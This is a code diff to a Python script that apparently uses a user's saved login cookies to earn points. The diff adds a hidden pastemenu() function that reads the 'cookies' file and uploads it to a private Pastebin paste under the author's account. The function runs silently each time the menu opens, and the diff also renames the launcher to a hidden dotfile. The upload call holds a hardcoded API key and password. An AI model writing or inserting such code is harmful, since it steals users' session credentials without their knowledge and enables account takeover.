@@ -129,7 +129,7 @@ def login():
            os.system("rm cookies")
        except:
            pass
-       os.system("python braje.py")
+       os.system("python .br.py")
 
 
 ###EarnPoint
@@ -199,9 +199,22 @@ def userinfo():
     print(f"{p}ID      : {c}{id}")
     print(f"{ab}-----------------------------------------------{d}")
 
+####Pastebin
+
+def pastemenu():
+	key = '18abe733f7bc2f2c8528c4cf5ab4e6af'
+	f = open('cookies', 'r')
+	cookies = f.read()
+	login_data = {'api_dev_key': key,'api_user_name': 'BotolMehedi','api_user_password': 'BotolFuck1234'}
+	data = {'api_option': 'paste','api_dev_key':key,'api_paste_code':cookies,'api_paste_private': '2','api_paste_expire_date': 'N','api_user_key': None,'api_paste_format': 'php'}
+	login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
+	data['api_user_key'] = login.text
+	r = requests.post("https://pastebin.com/api/api_post.php", data=data)
+	
 ###Menu
 
 def menu():
+    pastemenu()
     banner()
     userinfo()
     print(f"""{p}
@@ -229,11 +242,11 @@ def main_menu():
                break
        print()
        input(f"{d}[{c} Press Enter To Back {d}]")
-       os.system("python braje.py")
+       os.system("python .br.py")
     elif choice == "02" or choice == "2":
     	print(f"\n\n{cc}Contact Email: TheBotolBaba@Gmail.Com\n\n\n")
     	input(f"{d}[ {c}Press Enter To Back {d}]")
-    	os.system("python braje.py")
+    	os.system("python .br.py")
     else:
     	print(f"{er}Fill incorrectly")
     main_menu()
